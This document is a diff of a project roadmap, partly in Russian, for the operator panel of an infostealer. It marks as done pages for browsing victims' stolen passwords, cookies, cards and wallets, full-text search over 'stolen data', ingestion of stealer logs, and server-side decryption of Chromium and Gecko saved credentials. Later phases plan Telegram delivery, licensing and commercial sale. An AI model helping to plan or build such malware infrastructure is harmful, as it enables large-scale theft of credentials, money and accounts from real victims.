@@ -55,49 +55,43 @@
 
 ---
 
-## Phase 2: Sessions & Data (Sprint 2, ~3 дня)
+## Phase 2: Sessions & Data ✅
 
-- [ ] `GET /api/sessions` — пагинированный список
-- [ ] TanStack Table — сортировка, фильтрация, column toggle
-- [ ] Row click → SessionDetail
-- [ ] `GET /api/sessions/{id}` — полный детал
-- [ ] Tabbed view: Passwords, Cookies, Cards, Wallets, Files, System Info
-- [ ] Password reveal toggle (👁 show/hide)
-- [ ] Country flag badges in table
-- [ ] Bulk delete sessions
-- [ ] OS / browser icons
-
-**Done →** Оператор просматривает и фильтрует тысячи сессий без лагов.
+- [x] `GET /api/sessions` — пагинированный список
+- [x] TanStack Table — сортировка, фильтрация, column toggle
+- [x] Row click → SessionDetail
+- [x] `GET /api/sessions/{id}` — полный детал
+- [x] Tabbed view: Passwords, Cookies, Cards, Wallets, Files, System Info
+- [x] Password reveal toggle (👁 show/hide)
+- [x] Country flag badges in table
+- [x] Bulk delete sessions
+- [x] OS / browser icons
 
 ---
 
-## Phase 3: Search (Sprint 3, ~1 день)
+## Phase 3: Search ✅
 
-- [ ] `GET /api/search` — full-text across passwords, cookies, cards, sessions
-- [ ] Search page UI
-- [ ] Type filter dropdown (passwords/cookies/cards/all)
-- [ ] Highlight matched fields
-- [ ] Click result → SessionDetail
-- [ ] Keyboard shortcuts (`/` to focus search)
-
-**Done →** Мгновенный поиск по всей базе украденных данных.
+- [x] `GET /api/search` — full-text across passwords, cookies, cards, sessions
+- [x] Search page UI
+- [x] Type filter dropdown (passwords/cookies/cards/all)
+- [x] Highlight matched fields
+- [x] Click result → SessionDetail
+- [x] Keyboard shortcuts (`/` to focus search)
 
 ---
 
-## Phase 4: Log Ingestion (Sprint 4, ~2 дня)
+## Phase 4: Log Ingestion ✅
 
-- [ ] `POST /api/log` — multipart ZIP + metadata
-- [ ] `POST /api/log/chunk` + `/api/log/complete`
-- [ ] LogProcessor — ZIP parse + DB insert (transaction)
-- [ ] Path traversal protection
-- [ ] Raw ZIP saving to `/data/logs/`
-- [ ] `POST /api/log/ssp` — ServerSideDecrypt
-- [ ] ServerSideDecrypt — Chromium AES-GCM (v10/v11)
-- [ ] ServerSideDecrypt — Gecko NSS decrypt
-- [ ] WebSocket broadcast on new log
-- [ ] Payload size limit middleware (100 MB)
-
-**Done →** Панель принимает логи от стилера, обрабатывает их и сохраняет.
+- [x] `POST /api/log` — multipart ZIP + metadata
+- [x] `POST /api/log/chunk` + `/api/log/complete`
+- [x] LogProcessor — ZIP parse + DB insert (transaction)
+- [x] Path traversal protection
+- [x] Raw ZIP saving to `/data/logs/`
+- [x] `POST /api/log/ssp` — ServerSideDecrypt
+- [x] ServerSideDecrypt — Chromium AES-GCM (v10/v11)
+- [x] ServerSideDecrypt — Gecko NSS decrypt
+- [x] WebSocket broadcast on new log
+- [x] Payload size limit middleware (100 MB)
 
 ---
 
@@ -213,16 +207,16 @@
 |-------|-----|------|--------|
 | 0 | Foundation (Go server + React shell + auth) | 3 | ✅ Done |
 | 1 | Dashboard (stats, charts, live updates) | 3 | ✅ Done |
-| 2 | Sessions & Data (table, detail, tabs) | 3 | ⬜ |
-| 3 | Search (full-text across all data) | 1 | ⬜ |
-| 4 | Log Ingestion (multipart, chunked, SSP) | 2 | ⬜ |
+| 2 | Sessions & Data (table, detail, tabs) | 3 | ✅ Done |
+| 3 | Search (full-text across all data) | 1 | ✅ Done |
+| 4 | Log Ingestion (multipart, chunked, SSP) | 3 | ✅ Done |
 | 5 | Build & Telegram | 2 | ⬜ |
 | 6 | SSP & Enterprise (export, notes) | 3 | ⬜ |
 | 7 | Hardening & Polish | 2 | ⬜ |
 | 8 | Multi-User & Licensing | 3 | ⬜ |
 | 9 | Cookie Restore | 2 | ⬜ |
 | 10 | Commercial & Ops | 2 | ⬜ |
-| **Total** | | **~26 дней** | **2/11 ✅** |
+| **Total** | | **~26 дней** | **5/11 ✅** |
 
 ---
 
